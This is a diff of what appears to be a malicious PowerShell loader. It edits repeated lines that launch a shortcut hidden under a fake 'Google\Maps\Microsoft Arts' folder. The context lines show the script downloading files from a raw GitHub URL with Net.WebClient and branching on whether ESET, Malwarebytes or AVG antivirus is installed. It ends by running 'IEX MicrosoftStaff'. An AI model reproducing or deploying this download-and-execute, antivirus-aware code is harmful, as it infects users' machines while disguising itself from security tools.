@@ -36,7 +36,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 start-sleep -s 3
 Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 start-sleep -s 3
-Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
+
 }
 elseif([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")){
 
@@ -54,7 +54,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 start-sleep -s 3
 Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 start-sleep -s 3
-Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
+
 }
 
 elseif([System.IO.File]::Exists("C:\Program Files\Malwarebytes\Anti-Malware\mbamtray.exe")){
@@ -72,7 +72,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 start-sleep -s 3
 Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 start-sleep -s 3
-Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
+
 }
 
 elseif([System.IO.File]::Exists("C:\Program Files\AVG\Antivirus\AVGUI.exe")){
@@ -91,7 +91,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 start-sleep -s 3
 Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
 start-sleep -s 3
-Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
+
 }
 else{
 
@@ -165,8 +165,8 @@ start-sleep -s 3
 
 start-sleep -s 60
  Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
-# start-sleep -s 6
-# Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
+ start-sleep -s 6
+
 }
 }
 IEX MicrosoftStaff
